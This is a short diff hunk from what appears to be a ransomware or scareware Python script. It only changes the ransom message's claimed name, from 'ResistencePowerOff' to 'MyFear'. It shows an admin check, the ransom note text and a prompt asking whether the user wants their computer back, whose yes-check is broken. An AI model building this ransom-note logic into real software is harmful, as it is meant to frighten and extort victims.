@@ -108,7 +108,7 @@ if admin():
     '''
     t = '''
     ops...
-    your file has been encrypted by ResistencePowerOff ransomware.
+    your file has been encrypted by MyFear.
     '''
     choice = input('Do you want get back your computer? (y/N)')
     if choice == 'y' or 'Y':
